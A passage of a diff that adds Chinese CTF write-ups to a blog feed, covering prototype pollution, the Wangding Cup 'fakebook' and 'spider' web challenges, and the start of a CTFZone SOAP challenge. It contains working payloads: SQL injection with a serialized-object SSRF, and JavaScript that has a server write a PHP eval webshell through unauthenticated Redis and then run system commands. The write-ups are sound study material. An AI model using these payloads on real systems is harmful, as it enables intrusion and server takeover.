+&lt;p&gt;这就解释了上面的现象，为什么在 JSON.parse 后得到的对象不存在 prototype pollution 的问题，因为此时其所具有的 &lt;code&gt;__proto__&lt;/code&gt; 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution。&lt;/p&gt;
+
+&lt;p&gt;对 js 如何查找对象属性感兴趣的同学可以继续参考下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925144510-8c7aa826-c08e-1.png&#34; alt=&#34;attribute found&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;至此，我们再来梳理一下 prototype pollution attack 触发的流程：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;攻击者发送的字符串 &lt;code&gt;{&amp;quot;__proto__&amp;quot;:{&amp;quot;oops&amp;quot;:&amp;quot;It works !&amp;quot;}}&lt;/code&gt; 在被服务端调用 JSON.parse 解析后得到 obj1，但 obj1 的原型是安全的，此时 &lt;code&gt;__proto__&lt;/code&gt; 仅仅是 obj1 的一个普通的自有属性&lt;/li&gt;
+&lt;li&gt;服务端调用 clone 或类似具有风险的函数，得到了新的对象 obj2，此时 obj2 的原型已经被污染，指向了攻击者注入的属性 &lt;code&gt;{&amp;quot;oops&amp;quot;:&amp;quot;It works !&amp;quot;}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;服务端调用新的对象 obj2时，触发可能的危险操作&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;对该攻击的防御也很简单，在赋值操作时注意危险的 &lt;code&gt;__proto__&lt;/code&gt; 属性即可。&lt;/p&gt;
+
+&lt;p&gt;举例说明，下图是 npm 上的库 hoek 在 prototype pollution attack 发生后提交的 patch，可以看到只要简单的过滤即可防御该攻击：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925143329-ea8cb334-c08c-1.png&#34; alt=&#34;Patch&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://dinhbaoluciusteam.wordpress.com/2018/09/23/defcamp-dctf-2018-chat/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Defcamp (DCTF) 2018 – Chat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Prototype pollution attack in NodeJS application&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/310439&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Prototype pollution attack (Hoek)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Object - MDN 文档&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/shuiyi/p/5305435.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;三张图搞懂JavaScript的原型对象与原型链&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>网鼎杯-Web-Writeup</title>
+      <link>https://syang-ng.github.io/2018/08/wangding-web-writeup/</link>
+      <pubDate>Mon, 20 Aug 2018 18:35:43 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/08/wangding-web-writeup/</guid>
+      <description>
+
+&lt;h2 id=&#34;fakebook&#34;&gt;fakebook&lt;/h2&gt;
+
+&lt;p&gt;访问 &lt;code&gt;robots.txt&lt;/code&gt; 得到泄露的文件 &lt;code&gt;user.php.bak&lt;/code&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Disallow: /user.php.bak
+Sitemap: http://domain.com/sitemap.xml
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+class UserInfo
+{
+    public $name = &amp;quot;&amp;quot;;
+    public $age = 0;
+    public $blog = &amp;quot;&amp;quot;;
+
+    public function __construct($name, $age, $blog)
+    {
+        $this-&amp;gt;name = $name;
+        $this-&amp;gt;age = (int)$age;
+        $this-&amp;gt;blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this-&amp;gt;get($this-&amp;gt;blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this-&amp;gt;blog;
+        return preg_match(&amp;quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&amp;quot;, $blog);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;测试页面功能，可以猜测 &lt;code&gt;view.php?no=xxx&lt;/code&gt; 处存在 sql 注入的问题：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/view1.png&#34; alt=&#34;view 1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/view2.png&#34; alt=&#34;view 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到此时页面会报 unserialize() 的相应错误，那么可以做一个合理的猜测，页面会将从 mysql 中取出的数据，并将数据反序列化后再填充到页面上&lt;/p&gt;
+
+&lt;p&gt;而此时应该会调用 &lt;code&gt;getBlogContents()&lt;/code&gt; 函数，那么这里必然存在一个 SSRF 的问题，我们只要构造 payload 使得其访问 &lt;code&gt;/var/www/html/flag.php&lt;/code&gt; 即可&lt;/p&gt;
+
+&lt;p&gt;那么我们可以尝试构造相应序列化数据作为 payload：&lt;code&gt;O:8:&amp;quot;UserInfo&amp;quot;:3:{s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:24;s:4:&amp;quot;blog&amp;quot;;s:29:&amp;quot;file:///var/www/html/flag.php&amp;quot;;}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;最后 payload 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://80be5985cb9c4234bd4d0459d6a7f7238f336e1e2c514d60.game.ichunqiu.com/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:24;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27%23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;查看源代码即可获得 base64 编码后的 flag，解码即可得到 &lt;code&gt;flag{a004021a-5f34-4692-b9b2-f5b50e6c095f}&lt;/code&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3thMDA0MDIxYS01ZjM0LTQ2OTItYjliMi1mNWI1MGU2YzA5NWZ9IjsNCmV4aXQoMCk7DQo=&#39;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;我们可以通过相同的方式获得 &lt;code&gt;view.php&lt;/code&gt; 的源码来加深我们的理解：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php session_start(); ?&amp;gt;
+&amp;lt;?php require_once &#39;db.php&#39;; ?&amp;gt;
+&amp;lt;?php require_once &#39;user.php&#39;; ?&amp;gt;
+&amp;lt;?php require_once &#39;error.php&#39;; ?&amp;gt;
+&amp;lt;?php
+
+$db = new DB();
+
+?&amp;gt;
+&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang=&amp;quot;ko&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot;
+          content=&amp;quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;User&amp;lt;/title&amp;gt;
+
+    &amp;lt;?php require_once &#39;bootstrap.php&#39;; ?&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;?php
+
+$no = $_GET[&#39;no&#39;];
+if ($db-&amp;gt;anti_sqli($no))
+{
+    die(&amp;quot;no hack ~_~&amp;quot;);
+}
+
+$res = $db-&amp;gt;getUserByNo($no);
+$user = unserialize($res[&#39;data&#39;]);
+//print_r($res);
+
+?&amp;gt;
+&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
+    &amp;lt;table class=&amp;quot;table&amp;quot;&amp;gt;
+        &amp;lt;tr&amp;gt;
+            &amp;lt;th&amp;gt;
+                username
+            &amp;lt;/th&amp;gt;
+            &amp;lt;th&amp;gt;
+                age
+            &amp;lt;/th&amp;gt;
+            &amp;lt;th&amp;gt;
+                blog
+            &amp;lt;/th&amp;gt;
+        &amp;lt;/tr&amp;gt;
+        &amp;lt;tr&amp;gt;
+            &amp;lt;td&amp;gt;
+                &amp;lt;?php echo $res[&#39;username&#39;]; ?&amp;gt;
+            &amp;lt;/td&amp;gt;
+            &amp;lt;td&amp;gt;
+                &amp;lt;?php echo $user-&amp;gt;age; ?&amp;gt;
+            &amp;lt;/td&amp;gt;
+            &amp;lt;td&amp;gt;
+                &amp;lt;?php echo xss($user-&amp;gt;blog); ?&amp;gt;
+            &amp;lt;/td&amp;gt;
+        &amp;lt;/tr&amp;gt;
+    &amp;lt;/table&amp;gt;
+
+    &amp;lt;hr&amp;gt;
+    &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
+    &amp;lt;p&amp;gt;the contents of his/her blog&amp;lt;/p&amp;gt;
+    &amp;lt;hr&amp;gt;
+    &amp;lt;?php
+
+    $response = $user-&amp;gt;getBlogContents();
+    if ($response === 404)
+    {
+        echo &amp;quot;404 Not found&amp;quot;;
+    }
+
+    else
+    {
+        $base64 = base64_encode($response);
+        echo &amp;quot;&amp;lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,{$base64}&#39;&amp;gt;&amp;quot;;
+        // echo $response;
+    }
+
+    // var_dump($user-&amp;gt;getBlogContents());
+    ?&amp;gt;
+
+&amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;非常悲伤的在本题陷入误区了，选择了绕过 &lt;code&gt;isValidBlog&lt;/code&gt;，构造 url 使其指向 &lt;code&gt;127.0.0.1&lt;/code&gt; 但最后仍然不能访问到相应文件，想来是禁止了 http 协议的访问（😭&lt;/p&gt;
+
+&lt;h2 id=&#34;spider&#34;&gt;spider&lt;/h2&gt;
+
+&lt;p&gt;首先尝试访问 &lt;code&gt;robots.txt&lt;/code&gt;，发现存在 &lt;code&gt;/get_sourcecode&lt;/code&gt; 页面，但页面提示 &lt;code&gt;NOT 127.0.0.1&lt;/code&gt;，由此可以推测可能需要通过其他方式使得服务器去访问该网址&lt;/p&gt;
+
+&lt;p&gt;那么我们从网址提供的功能入手：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/spider.png&#34; alt=&#34;spider&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;根据提示我们可以知道该网站提供的是动态爬虫的功能，简单说该页面可以抓取动态网页，那么显然我们可以在我们提交的 html 文件中写入 js 代码，js 代码在服务器访问的过程中会被执行：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+	&amp;lt;body&amp;gt;
+		&amp;lt;a id=&#39;test&#39; href=&amp;quot;&amp;quot;&amp;gt;1&amp;lt;/a&amp;gt;
+		&amp;lt;script src=&amp;quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+		&amp;lt;script&amp;gt;
+		$.get(&#39;http://127.0.0.1/get_sourcecode&#39;, function(data){
+			document.getElementById(&amp;quot;test&amp;quot;).innerHTML=data;
+		});
+		&amp;lt;/script&amp;gt;
+	&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到服务器访问 &lt;code&gt;get_sourcecode&lt;/code&gt; 并在相应页面上输出内容：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/sourcecode.png&#34; alt=&#34;source code&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;获得源代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+
+from flask import Flask, request 
+from flask import render_template
+import os
+import uuid
+import tempfile
+import subprocess
+import time
+import json
+
+app = Flask(__name__ , static_url_path=&#39;&#39;)
+
+def proc_shell(cmd):
+    out_temp = tempfile.SpooledTemporaryFile(bufsize=1000*1000)
+    fileno = out_temp.fileno()
+    proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=fileno, shell=False)
+    start_time = time.time()
+    while True:
+        if proc.poll() == None:
+            if time.time() - start_time &amp;amp;gt; 30:
+                proc.terminate()
+                proc.kill()
+                proc.communicate()
+                out_temp.seek(0)
+                out_temp.close()
+                return
+            else:
+                time.sleep(1)
+        else:
+            proc.communicate()
+            out_temp.seek(0)
+            data = out_temp.read()
+            out_temp.close()
+            return data
+
+def casperjs_html(url):
+    cmd = &#39;casperjs {0} --ignore-ssl-errors=yes --url={1}&#39;.format(os.path.dirname(__file__) + &#39;/casper/casp.js&#39; ,url)
+    cmd = cmd.split(&#39; &#39;)
+    stdout = proc_shell(cmd)
+    try:
+        result = json.loads(stdout)
+        links = result.get(&#39;resourceRequestUrls&#39;)
+        return links
+    except Exception, e:
+        return []
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def index():
+    if request.method == &#39;GET&#39;:
+        return render_template(&#39;index.html&#39;)
+    else:
+        f = request.files[&#39;file&#39;]
+        filename = str(uuid.uuid1()) + &#39;.html&#39;
+        basepath = os.path.dirname(__file__)
+        upload_path = os.path.join(basepath, &#39;static/upload/&#39;, filename)
+        content = f.read()
+        #hint
+        if &#39;level=low_273eac1c&#39; not in content and &#39;dbfilename&#39; in content.lower():
+            return render_template(&#39;index.html&#39;, msg=u&#39;Warning: 发现恶意关键字&#39;)
+        #hint
+        with open(upload_path, &#39;w&#39;) as f:
+            f.write(content)
+        url = &#39;http://127.0.0.1:80/upload/&#39;+filename
+        links = casperjs_html(url)
+        links = &#39;\n&#39;.join(links)
+        if not links:
+            links = &#39;NULL&#39;
+        links = &#39;URL: &#39;+url+&#39;\n&#39;+links
+        return render_template(&#39;index.html&#39;, links=links)
+
+@app.route(&#39;/get_sourcecode&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def get_code():
+    if request.method == &#39;GET&#39;:
+        ip = request.remote_addr
+        if ip != &#39;127.0.0.1&#39;:
+            return &#39;NOT 127.0.0.1&#39;
+        else:
+            with open(os.path.dirname(__file__)+&#39;/run.py&#39;) as f:
+                code = f.read()
+            return code
+    else:
+        return &#39;&#39;
+
+@app.errorhandler(404)
+def page_not_found(error):
+    return &#39;404&#39;
+
+@app.errorhandler(500)
+def internal_server_error(error):
+    return &#39;500&#39;
+
+@app.errorhandler(403)
+def unauthorized(error):
+    return &#39;403&#39;
+
+if __name__ == &#39;__main__&#39;:
+    pass
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据代码中的提示，我们可以发现我们需要利用的是 redis 的未授权访问来写一个 webshell&lt;/p&gt;
+
+&lt;p&gt;在本题中，redis 服务确实在运行，但我们直接访问 6379 端口可能会出错，但不影响我们来写 payload&lt;/p&gt;
+
+&lt;p&gt;根据提示我们知道 8000 端口存在着 apache2 的服务（当然是只开放给 127.0.0.1 的），那么我们可以尝试通过 redis 来写一下 php 的 webshell 然后通过在通过服务端的访问来触发（这里吐槽一句开端口这种事情不给 hint 的话要扫到猴年马月😓&lt;/p&gt;
+
+&lt;p&gt;下面就是 payload 时间：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+	&amp;lt;a id=&#39;test&#39; href=&amp;quot;&amp;quot;&amp;gt;level=low_273eac1c&amp;lt;/a&amp;gt;
+	&amp;lt;script&amp;gt;
+		var xmlhttp;
+		if (window.XMLHttpRequest) {
+			xmlhttp = new XMLHttpRequest();
+		}
+		else {
+			xmlhttp = newActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
+		}
+		var formData = new FormData();
+		formData.append(&amp;quot;0&amp;quot;, &amp;quot;flushall&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;config set dir /var/www/html/&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;config set dbfilename shell.php&amp;quot; + &amp;quot;\n&amp;quot; + &#39;set 1 &amp;quot;\\n\\n&amp;lt;?php header(\&#39;Access-Control-Allow-Origin:*\&#39;);eval($_GET[_]);?&amp;gt;\\n\\n&amp;quot;&#39; + &amp;quot;\n&amp;quot; + &amp;quot;save&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;quit&amp;quot;);
+		xmlhttp.open(&amp;quot;POST&amp;quot;, &amp;quot;http://127.0.0.1:6379&amp;quot;, true);
+		xmlhttp.send(formData);
+	&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;html&amp;gt;
+	&amp;lt;body&amp;gt;
+		&amp;lt;a id=&#39;test&#39; href=&amp;quot;&amp;quot;&amp;gt;1&amp;lt;/a&amp;gt;
+		&amp;lt;script src=&amp;quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+		&amp;lt;script&amp;gt;
+		$.get(&#39;http://127.0.0.1:8000/shell.php?_=system(&amp;quot;cat flag.php&amp;quot;);&#39;, function(data){
+			document.getElementById(&amp;quot;test&amp;quot;).innerHTML=data;
+		});
+		&amp;lt;/script&amp;gt;
+	&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;还是太菜了（哭泣😭&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/yZ-Xp32tCPWbDiFgAHiWgw&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;网鼎杯第一场spider题详细writeup&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2607&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;2018网鼎杯第一场Web题解&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CTFZone 2018</title>
+      <link>https://syang-ng.github.io/2018/07/ctfzone-2018/</link>
+      <pubDate>Mon, 23 Jul 2018 14:39:46 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/07/ctfzone-2018/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;CTFZone 2018 整体上还是学习到一些新姿势了的，就是可惜情不自禁的摸起了鱼 (lll￢ω￢)&lt;/p&gt;
+
+&lt;h2 id=&#34;piggy-bank&#34;&gt;Piggy-Bank&lt;/h2&gt;
+
+&lt;p&gt;本题是 SOAP 相关的注入题，主要有以下 5 个页面：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Profile - 个人信息页面，最关键的是上面的账号 ID 和账户余额&lt;/li&gt;
+&lt;li&gt;Menu - 空白页面&lt;/li&gt;
+&lt;li&gt;Transfer - 可以在账户间实现转账&lt;/li&gt;
+&lt;li&gt;VIP - 只有当账户余额大于 1,000,000 才能访问，可以从中得到 flag&lt;/li&gt;
+&lt;li&gt;For Developers - 该页面的注释提示我们可以访问隐藏的定义文件： &lt;!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;通过注释，访问 &lt;code&gt;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php&lt;/code&gt; 可以得到对应 API 定义的 WSDL 文件&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;wsdl:definitions name=&amp;quot;Bank&amp;quot;
+targetNamespace=&amp;quot;urn:Bank&amp;quot;
+xmlns:tns=&amp;quot;urn:Bank&amp;quot;
+xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/wsdl/soap/&amp;quot;
+xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;
+xmlns:soapenc=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;
+xmlns:wsdl=&amp;quot;http://schemas.xmlsoap.org/wsdl/&amp;quot;
+xmlns=&amp;quot;http://schemas.xmlsoap.org/wsdl/&amp;quot;&amp;gt;
+  &amp;lt;message name=&amp;quot;BalanceRequest&amp;quot;&amp;gt;
+    &amp;lt;part name=&amp;quot;wallet_num&amp;quot; type=&amp;quot;xsd:decimal&amp;quot;/&amp;gt;
+  &amp;lt;/message&amp;gt;
+  &amp;lt;message name=&amp;quot;BalanceResponse&amp;quot;&amp;gt;
+    &amp;lt;part name=&amp;quot;code&amp;quot; type=&amp;quot;xsd:float&amp;quot;/&amp;gt;
+    &amp;lt;part name=&amp;quot;status&amp;quot; type=&amp;quot;xsd:string&amp;quot;/&amp;gt;
+  &amp;lt;/message&amp;gt;
+  &amp;lt;message name=&amp;quot;internalTransferRequest&amp;quot;&amp;gt;
+    &amp;lt;part name=&amp;quot;receiver_wallet_num&amp;quot; type=&amp;quot;xsd:decimal&amp;quot;/&amp;gt;
+    &amp;lt;part name=&amp;quot;sender_wallet_num&amp;quot; type=&amp;quot;xsd:decimal&amp;quot;/&amp;gt;
+    &amp;lt;part name=&amp;quot;amount&amp;quot; type=&amp;quot;xsd:float&amp;quot;/&amp;gt;
+    &amp;lt;part name=&amp;quot;token&amp;quot; type=&amp;quot;xsd:string&amp;quot;/&amp;gt;
+  &amp;lt;/message&amp;gt;
+  &amp;lt;message name=&amp;quot;internalTransferResponse&amp;quot;&amp;gt;
+    &amp;lt;part name=&amp;quot;code&amp;quot; type=&amp;quot;xsd:float&amp;quot;/&amp;gt;
+    &amp;lt;part name=&amp;quot;status&amp;quot; type=&amp;quot;xsd:string&amp;quot;/&amp;gt;
+  &amp;lt;/message&amp;gt;
+  &amp;lt;portType name=&amp;quot;BankServicePort&amp;quot;&amp;gt;
+    &amp;lt;operation name=&amp;quot;requestBalance&amp;quot;&amp;gt;
+      &amp;lt;input message=&amp;quot;tns:BalanceRequest&amp;quot;/&amp;gt;
+      &amp;lt;output message=&amp;quot;tns:BalanceResponse&amp;quot;/&amp;gt;
+    &amp;lt;/operation&amp;gt;
+    &amp;lt;operation name=&amp;quot;internalTransfer&amp;quot;&amp;gt;
+      &amp;lt;input message=&amp;quot;tns:internalTransferRequest&amp;quot;/&amp;gt;
+      &amp;lt;output message=&amp;quot;tns:internalTransferResponse&amp;quot;/&amp;gt;
+    &amp;lt;/operation&amp;gt;
+  &amp;lt;/portType&amp;gt;
+  &amp;lt;binding name=&amp;quot;BankServiceBinding&amp;quot; type=&amp;quot;tns:BankServicePort&amp;quot;&amp;gt;
+    &amp;lt;soap:binding style=&amp;quot;rpc&amp;quot; transport=&amp;quot;http://schemas.xmlsoap.org/soap/http&amp;quot;/&amp;gt;
+    &amp;lt;operation name=&amp;quot;requestBalance&amp;quot;&amp;gt;
+      &amp;lt;soap:operation soapAction=&amp;quot;urn:requestBalanceAction&amp;quot;/&amp;gt;
+      &amp;lt;input&amp;gt;
+        &amp;lt;soap:body use=&amp;quot;encoded&amp;quot; namespace=&amp;quot;urn:Bank&amp;quot; encodingStyle=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;/&amp;gt;
+      &amp;lt;/input&amp;gt;
+      &amp;lt;output&amp;gt;
+        &amp;lt;soap:body use=&amp;quot;encoded&amp;quot; namespace=&amp;quot;urn:Bank&amp;quot; encodingStyle=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;/&amp;gt;
+      &amp;lt;/output&amp;gt;
+    &amp;lt;/operation&amp;gt;
+    &amp;lt;operation name=&amp;quot;internalTransfer&amp;quot;&amp;gt;
+      &amp;lt;soap:operation soapAction=&amp;quot;urn:internalTransferAction&amp;quot;/&amp;gt;
+      &amp;lt;input&amp;gt;
+        &amp;lt;soap:body use=&amp;quot;encoded&amp;quot; namespace=&amp;quot;urn:Bank&amp;quot; encodingStyle=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;/&amp;gt;
+      &amp;lt;/input&amp;gt;
+      &amp;lt;output&amp;gt;
+        &amp;lt;soap:body use=&amp;quot;encoded&amp;quot; namespace=&amp;quot;urn:Bank&amp;quot; encodingStyle=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;/&amp;gt;
+      &amp;lt;/output&amp;gt;
+    &amp;lt;/operation&amp;gt;
+  &amp;lt;/binding&amp;gt;
+  &amp;lt;wsdl:service name=&amp;quot;BankService&amp;quot;&amp;gt;
+    &amp;lt;wsdl:port name=&amp;quot;BankServicePort&amp;quot; binding=&amp;quot;tns:BankServiceBinding&amp;quot;&amp;gt;
+      &amp;lt;soap:address location=&amp;quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&amp;quot; /&amp;gt;
+    &amp;lt;/wsdl:port&amp;gt;
+  &amp;lt;/wsdl:service&amp;gt;
+&amp;lt;/wsdl:definitions&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过 burp 的 wsdler 插件，我们能很方便地使用该文件定义好的 Web 服务：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/burp.png&#34; alt=&#34;burp&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过简单使用，我们能发现这两个 Web 服务的作用&lt;/p&gt;
+
+&lt;h3 id=&#34;requestbalance&#34;&gt;requestBalance&lt;/h3&gt;
+
+&lt;p&gt;获得对应 id 用户的余额&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/requestBalance.png&#34; alt=&#34;requestBalance&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;internaltransfer&#34;&gt;internalTransfer&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/internalTransfer.png&#34; alt=&#34;internalTransfer&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;attack&#34;&gt;Attack&lt;/h3&gt;
+
+&lt;p&gt;那么现在我们攻击的思路就非常明确了：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;通过遍历 id 的方式调用 requestBalance，获得余额超过百万用户的 id&lt;/li&gt;
+&lt;li&gt;通过调用 internalTransfer 的方式将其的余额转至我们的名下&lt;/li&gt;
+&lt;li&gt;从 VIP 页面获得 flag&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;通过 burp 的 intruder 模块进行遍历，我们能很轻易的获得所有账户的余额&lt;/p&gt;
+
+&lt;p&gt;然后下面就是希望直接通过转账的方式使我们的余额增加，但可以看到上面我们直接转账的尝试失败了，因为缺少了相应的 token，token 是由服务端生成的所以我们无法控制，这里也不存在一个泄露 token 的点，所以我们只能通过向服务端注入 xml 文件的方式进行攻击：&lt;/p&gt;
+
